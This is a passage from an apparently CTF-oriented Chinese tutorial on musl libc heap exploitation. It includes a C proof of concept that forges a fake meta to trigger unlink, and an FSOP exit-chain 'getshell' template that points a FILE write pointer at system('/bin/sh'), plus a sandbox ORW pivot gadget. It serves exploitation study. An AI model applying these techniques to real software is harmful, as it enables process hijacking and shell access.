size_classes[meta-&gt;sizeclass]_index ，offset &lt; size_classes[meta-&gt;sizeclass]_(index+1)</code> ，这两个检查 <code>offset</code> 和 <code>chunk</code> 大小是否对应</li><li><code>assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);</code> ，即检查 <code>offset</code> 是否越界</li></ul><p>紧接着还会调用 <code>get_nominal_size</code>，其中有对 <code>chunk</code> 的检查，总结来说 <code>chunk</code> 区域尽量都填 <code>0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_nominal_size</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *end)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> reserved = p[<span class="number">-3</span>] &gt;&gt; <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (reserved &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        assert(reserved == <span class="number">5</span>);</span><br><span class="line">        reserved = *(<span class="type">const</span> <span class="type">uint32_t</span> *) (end - <span class="number">4</span>);</span><br><span class="line">        assert(reserved &gt;= <span class="number">5</span>);</span><br><span class="line">        assert(!end[<span class="number">-5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(reserved &lt;= end - p);</span><br><span class="line">    assert(!*(end - reserved));</span><br><span class="line">    <span class="comment">// also check the slot&#x27;s overflow byte</span></span><br><span class="line">    assert(!*end);</span><br><span class="line">    <span class="keyword">return</span> end - reserved - p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后在 <code>free</code> 中的循环满足条件跳出循环调用 <code>nontrivial_free</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">    <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">    <span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">    assert(!(mask &amp; self));</span><br><span class="line">    <span class="keyword">if</span> (!freed || mask + self == all) <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br></pre></td></tr></table></figure><p>进入 <code>nontrivial_free</code> 函数后会执行如下代码。<code>okay_to_free</code> 函数返回非 <code>0</code> 的前提是 <code>meta-&gt;freeable</code> 非 <code>0</code>，另外还要确保 <code>meta-&gt;sizeclass &lt; 48</code> 。之后调用 <code>dequeue</code> 函数触发 <code>unlink</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span> &lt;&lt; i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask + self == (<span class="number">2u</span> &lt;&lt; g-&gt;last_idx) - <span class="number">1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">    <span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">    <span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">    <span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="type">int</span> activate_new = (ctx.active[sc] == g);</span><br><span class="line">        dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">        <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">            activate_group(ctx.active[sc]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>之后进入 <code>free_group</code> 函数后为了减小伪造难度不再调用 <code>nontrivial_free</code> 要保证 <code>maplen</code> 不为零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">        ctx.usage_by_class[sc] -= g-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">        step_seq();</span><br><span class="line">        record_seq(sc);</span><br><span class="line">        mi.base = g-&gt;mem;</span><br><span class="line">        mi.len = g-&gt;maplen * <span class="number">4096UL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">        <span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">        g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">        mi = nontrivial_free(m, idx);</span><br><span class="line">    &#125;</span><br><span class="line">    free_meta(g);</span><br><span class="line">    <span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IB 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_CHUNK_SIZE 0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_CHUNK_INDEX 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_INDEX 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">        <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">        <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">        <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">        <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">        <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">        <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">        <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">        <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">        <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">size_to_class</span><span class="params">(<span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    n = (n + IB - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="type">int</span> i = (<span class="number">28</span> - __builtin_ctz(n)) * <span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i + <span class="number">1</span>]) i += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i]) i++;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;</span><br><span class="line">    <span class="type">int</span> init_done;</span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span></span><br><span class="line">    <span class="type">size_t</span> usage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx: <span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">uintptr_t</span> last_idx: <span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable: <span class="number">1</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass: <span class="number">6</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> maplen: <span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>) - <span class="number">12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> *<span class="title">ctx</span> =</span> (<span class="keyword">struct</span> malloc_context *) (&amp;<span class="built_in">printf</span> + <span class="number">0x247193</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">target</span> =</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *mmap_space = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">fake_meta_area</span> =</span> mmap_space;</span><br><span class="line">    fake_meta_area-&gt;check = ctx-&gt;secret;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">fake_meta</span> =</span> (<span class="keyword">struct</span> meta *) ((<span class="type">uint64_t</span>) mmap_space + <span class="number">0x100</span>);</span><br><span class="line">    fake_meta-&gt;maplen = <span class="number">1</span>;</span><br><span class="line">    fake_meta-&gt;sizeclass = size_to_class(FAKE_CHUNK_SIZE - IB);</span><br><span class="line">    fake_meta-&gt;last_idx = LAST_INDEX;</span><br><span class="line">    fake_meta-&gt;freeable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">fake_group</span> =</span> (<span class="keyword">struct</span> group *) ((<span class="type">uint64_t</span>) mmap_space + <span class="number">0x1000</span>);</span><br><span class="line">    fake_meta-&gt;mem = fake_group;</span><br><span class="line">    fake_group-&gt;meta = fake_meta;</span><br><span class="line">    fake_meta-&gt;avail_mask = ((<span class="number">2U</span> &lt;&lt; LAST_INDEX) - <span class="number">1</span>) ^ (<span class="number">1</span> &lt;&lt; FAKE_CHUNK_INDEX);</span><br><span class="line">    fake_meta-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *fake_chunk = (<span class="type">uint8_t</span> *) ((<span class="type">uint64_t</span>) fake_group-&gt;storage + size_classes[fake_meta-&gt;sizeclass] * UNIT * FAKE_CHUNK_INDEX);</span><br><span class="line">    *(<span class="type">uint16_t</span> *) (fake_chunk - <span class="number">2</span>) = (fake_chunk - fake_group-&gt;storage) / UNIT;</span><br><span class="line">    fake_chunk[<span class="number">-3</span>] = FAKE_CHUNK_INDEX;</span><br><span class="line"></span><br><span class="line">    fake_meta-&gt;prev = fake_meta-&gt;next = &amp;target;</span><br><span class="line">    <span class="built_in">free</span>(fake_chunk);</span><br><span class="line">    assert(target.prev == target.next &amp;&amp; target.prev == &amp;target);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fsop"><a href="#fsop" class="headerlink" title="fsop"></a>fsop</h2><h3 id="IO-file结构体"><a href="#IO-file结构体" class="headerlink" title="IO_file结构体"></a>IO_file结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">    <span class="type">int</span> (*close)(FILE *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">    <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    FILE *prev, *next;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> pipe_pid;</span><br><span class="line">    <span class="type">long</span> lockcount;</span><br><span class="line">    <span class="type">int</span> mode;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> lbf;</span><br><span class="line">    <span class="type">void</span> *cookie;</span><br><span class="line">    <span class="type">off_t</span> off;</span><br><span class="line">    <span class="type">char</span> *getln_buf;</span><br><span class="line">    <span class="type">void</span> *mustbezero_2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">    <span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">    FILE *prev_locked, *next_locked;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="exit利用链"><a href="#exit利用链" class="headerlink" title="exit利用链"></a>exit利用链</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="keyword">volatile</span> __stdin_used = &amp;__stdin_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stdout_used = &amp;__stdout_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stderr_used = &amp;__stderr_FILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">    __funcs_on_exit();</span><br><span class="line">    __libc_exit_fini();</span><br><span class="line">    __stdio_exit();</span><br><span class="line">    _Exit(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>) &#123;</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">for</span> (f = *__ofl_lock(); f; f = f-&gt;next) close_file(f);</span><br><span class="line">    close_file(__stdin_used);</span><br><span class="line">    close_file(__stdout_used);</span><br><span class="line">    close_file(__stderr_used);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">    FFINALLOCK(f);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos - f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>exit</code>函数最终会调用到三个<code>io file</code>的<code>write</code>函数和<code>seek</code>函数，我们可以将 <code>FILE</code> 结构体开头的几个字节修改为 <code>/bin/sh</code> ，再修改 <code>write</code> 指针的值为 <code>system</code> ，以及修改 <code>f-&gt;wpos</code> 、<code>f-&gt;wbase</code> 中其中之一就可以调用到 <code>system(“/bin/sh”)</code><br>总结来说，就是在无沙箱时，需要修改 <code>_IO_FILE</code> 结构体的几个地方：</p><ul><li>起始位置写入 <code>/bin/sh</code></li><li><code>write</code> 写入 <code>system</code> 函数地址。</li><li>好将 <code>lock</code> 设置为小于 <code>0</code> 避免程序卡死在 <code>__lockfile</code> 函数中。(等于 <code>0</code> 貌似也可以)</li></ul><p>fake_file getshell模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x1919810</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc_base+libc.symols[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br></pre></td></tr></table></figure><p>若需要<code>orw</code>，这需要一下<code>gadget</code>：</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br></pre></td></tr></table></figure><p>总结来说，就是在有沙箱时，需要修改 <code>_IO_FILE</code> 结构体的 <code>3</code> 个地方：</p><ul><li><code>f-&gt;wbase</code> 写入第一个 <code>gadget</code> 地址使得 <code>f-&gt;wpos 、f-&gt;wbase</code> 不等的同时能够执行到 <code>gadget</code></li><li><code>write</code> 写入刚才提到的栈迁移的 <code>gadget</code></li><li>偏移 <code>0x30</code> 处写入新的栈地址配合栈迁移 <code>gadget</code> 完成栈迁移</li><li>此外还需要在其他地方构造好 <code>ROP</code> 链用于 <code>orw</code></li></ul><p>模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 